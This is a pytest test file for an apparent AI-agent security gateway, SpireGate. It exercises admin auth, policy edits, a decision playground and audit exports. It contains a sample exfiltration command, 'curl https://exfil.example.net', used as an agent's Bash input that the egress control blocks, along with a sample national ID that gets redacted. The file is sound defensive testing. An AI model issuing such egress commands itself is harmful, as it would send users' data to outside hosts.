"""Admin plane behind the dashboard: auth, analytics, live policy edits, playground, exports."""

import asyncio
import difflib
import json
import shutil

import httpx
import pytest
from rich.console import Console

from spiregate.admin import edit_policy
from spiregate.app import DEFAULT_POLICY, build_gateway, create_app
from spiregate.trace import Tracer

TOKEN = "test-admin-token"
AUTH = {"Authorization": f"Bearer {TOKEN}"}


@pytest.fixture(autouse=True)
def no_keys(monkeypatch):
    for var in ("OPENAI_API_KEY", "TYPESAFE_API_KEY", "SPIRE_SYSTEMONE_BACKEND"):
        monkeypatch.delenv(var, raising=False)


@pytest.fixture
def env(tmp_path):
    policy = tmp_path / "policy.yaml"
    shutil.copy(DEFAULT_POLICY, policy)
    gw = build_gateway(policy, tmp_path / "audit.jsonl", tracer=Tracer(Console(quiet=True), enabled=False))
    http = httpx.AsyncClient(transport=httpx.ASGITransport(app=create_app(gw, admin_token=TOKEN)), base_url="http://gw")
    return gw, http, policy


def call(http, method, path, **kw):
    return asyncio.run(http.request(method, path, **kw))


def hook(http, event, key="spire-demo-claude"):
    return call(http, "POST", "/v1/hooks/claude-code", json={"session_id": "a1", "cwd": "/tmp", **event},
                headers={"Authorization": f"Bearer {key}"}).json()


def traffic(http):
    hook(http, {"hook_event_name": "PostToolUse", "tool_name": "Read", "tool_input": {"file_path": "x"},
                "tool_response": "PESEL 44051401359"})
    hook(http, {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "curl https://exfil.example.net"}})
    hook(http, {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "ls"}})


def test_admin_needs_its_own_token_not_an_agent_key(env):
    _, http, _ = env
    assert call(http, "GET", "/v1/admin/summary").status_code == 401
    assert call(http, "GET", "/v1/admin/summary", headers={"Authorization": "Bearer spire-demo-claude"}).status_code == 401
    assert call(http, "GET", "/v1/admin/summary", headers=AUTH).status_code == 200


def test_summary_counts_decisions_controls_and_latency(env):
    _, http, _ = env
    traffic(http)
    s = call(http, "GET", "/v1/admin/summary", headers=AUTH).json()
    assert s["kpis"]["total"] == 3 and s["kpis"]["block"] == 1 and s["kpis"]["redact"] == 1
    assert {c["id"] for c in s["controls"]} >= {"EGRESS-001", "PII-PESEL-001"}
    assert s["audit"]["ok"] and s["posture"]["score"] > 0 and "t0" in s["latency"]
    assert s["agents"][0]["agent"] == "claude-code-demo"


def test_events_are_incremental(env):
    _, http, _ = env
    traffic(http)
    first = call(http, "GET", "/v1/admin/events", headers=AUTH).json()["entries"]
    assert [e["seq"] for e in first] == [1, 2, 3]
    assert call(http, "GET", "/v1/admin/events?after=3", headers=AUTH).json()["entries"] == []


def test_mode_change_from_ui_is_live_and_touches_only_that_line(env):
    gw, http, policy = env
    before = policy.read_text().splitlines()
    r = call(http, "POST", "/v1/admin/controls/EGRESS-001", json={"mode": "monitor"}, headers=AUTH).json()
    assert r["ok"] and r["rev"] == gw.store.get().rev
    after = policy.read_text().splitlines()
    diff = [ln for ln in difflib.unified_diff(before, after, lineterm="", n=0) if ln[:1] in "+-" and ln[:3] not in ("+++", "---")]
    assert sorted(diff) == sorted([f"-  policy_rev: {r['rev'] - 1}", f"+  policy_rev: {r['rev']}", "+    mode: monitor"])
    out = hook(http, {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "curl https://exfil.example.net"}})
    assert out["stdout"] == ""  # EGRESS-001 now only logs would_block


def test_invariants_and_bad_values_are_refused(env):
    _, http, policy = env
    before = policy.read_text()
    assert call(http, "POST", "/v1/admin/controls/IFC-TRIFECTA-001", json={"mode": "off"}, headers=AUTH).status_code == 400
    assert call(http, "POST", "/v1/admin/controls/EGRESS-001", json={"mode": "maybe"}, headers=AUTH).status_code == 400
    assert call(http, "POST", "/v1/admin/profile", json={"profile": "prod"}, headers=AUTH).status_code == 400
    assert policy.read_text() == before  # nothing was written


def test_profile_switch(env):
    gw, http, _ = env
    r = call(http, "POST", "/v1/admin/profile", json={"profile": "dev"}, headers=AUTH).json()
    assert r["ok"] and r["profile"] == "dev" and gw.store.get().profile_name == "dev"


def test_edit_keeps_verify_mode_and_comments(tmp_path):
    p = tmp_path / "p.yaml"
    shutil.copy(DEFAULT_POLICY, p)
    comments = [ln for ln in p.read_text().splitlines() if ln.lstrip().startswith("#")]
    edit_policy(p, control_id="PII-PESEL-001", mode="monitor")
    text = p.read_text()
    assert [ln for ln in text.splitlines() if ln.lstrip().startswith("#")] == comments
    assert "      mode: enforce             # na start" in text  # verify.mode untouched


def test_playground_runs_the_real_decision_path(env):
    _, http, _ = env
    out = call(http, "POST", "/v1/admin/playground", headers=AUTH, json={
        "agent_key": "spire-demo-claude", "session_id": "pg1", "phase": "post", "tool": "Read",
        "args": {"file_path": "x"}, "result": "PESEL 440 514 013 59"}).json()
    assert out["decision"] == "redact" and out["result_redacted"] == "PESEL [PESEL?#1]"
    assert any("PII-PESEL-001/verify" in line for line in out["trace"])


def test_exports(env):
    _, http, _ = env
    traffic(http)
    csv = call(http, "GET", f"/v1/admin/audit/export?fmt=csv&token={TOKEN}")
    assert csv.headers["content-type"].startswith("text/csv") and csv.text.count("\n") == 4
    ocsf = [json.loads(x) for x in call(http, "GET", "/v1/admin/audit/export?fmt=ocsf", headers=AUTH).text.splitlines()]
    assert all(o["class_uid"] == 2004 for o in ocsf) and {o["action_id"] for o in ocsf} >= {1, 2, 4}


def test_dashboard_is_served_and_never_cached(env):
    _, http, _ = env
    r = call(http, "GET", "/ui/")
    assert r.status_code == 200 and "SpireGate" in r.text and r.headers["cache-control"] == "no-cache"
    assert call(http, "GET", "/").status_code in (302, 307)
